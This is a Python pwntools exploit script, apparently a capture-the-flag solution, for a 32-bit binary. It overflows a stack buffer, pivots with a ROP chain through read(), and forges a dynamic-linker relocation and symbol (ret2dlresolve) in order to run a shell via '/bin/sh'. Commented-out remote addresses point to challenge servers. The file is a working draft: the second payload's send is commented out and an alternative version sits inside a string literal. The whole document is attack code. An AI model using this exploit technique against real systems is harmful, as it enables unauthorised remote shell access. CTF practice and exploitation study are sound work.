from pwn import *

# r = remote("35.243.188.20", 2002)
# r = remote("51.68.189.144", 31007)
r = remote("127.0.0.1", 8888)
context.arch = "i386"

pop_ebp = 0x0804869b
pop_esi_edi_ebp = 0x08048699
leave_ret = 0x080484a5

buf = 0x0804a400
read_plt = 0x080483c0
read_got = 0x0804a00c
addr_plt_start = 0x080483b0
addr_rel_plt = 0x08048354
#index_off = (buf + 28) - addr_rel_plt
addr_dynsym = 0x080481cc
addr_dynstr = 0x0804828c
#addr_fake_sym = buf + 36
#align = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
#addr_fake_sym = addr_fake_sym + align
#index_dynsym = (addr_fake_sym - addr_dynsym) / 0x10
#r_info = (index_dynsym << 8) | 0x7
#fake_reloc = p32(read_got) + p32(r_info)
#st_name = (addr_fake_sym + 16) - addr_dynstr
#fake_sym = flat([st_name, 0, 0, 0x12])

payload1 = "a" * 76 + flat([read_plt, pop_esi_edi_ebp, 0, buf, 100, pop_ebp, buf, leave_ret])
raw_input('aaa')
r.send(payload1)
cmd = "/bin/sh\x00"

index_offset = (buf + 28) - addr_rel_plt
puts_got = 0x804a018
addr_fake_sym = buf + 36
align = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
addr_fake_sym = addr_fake_sym + align
index_dynsym = (addr_fake_sym - addr_dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(puts_got) + p32(r_info)
st_name = 0x26
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = "aaaa"
payload2 += p32(addr_plt_start)
payload2 += p32(index_offset)
payload2 += "aaaa"
payload2 += p32(buf+80)
payload2 += "aaaaaaaa"
payload2 += fake_reloc
payload2 += "b" * align
payload2 += fake_sym
payload2 += "a" * (80 - len(payload2))
payload2 += cmd
payload2 += "a" * (100 - len(payload2))
#raw_input('aaa')
#r.send(payload2)

"""
payload2 = flat(["aaaa", addr_plt_start, index_off, "aaaa", buf+80, "aaaa", "aaaa"])
payload2 += fake_reloc
payload2 += "b" * align
payload2 += fake_sym
payload2 += "system\x00"
payload2 += "a" * (80 - len(payload2))
payload2 += cmd
payload2 += "a" * (100 - len(payload2))
#raw_input('aaa')
r.send(payload2)
"""

r.interactive()

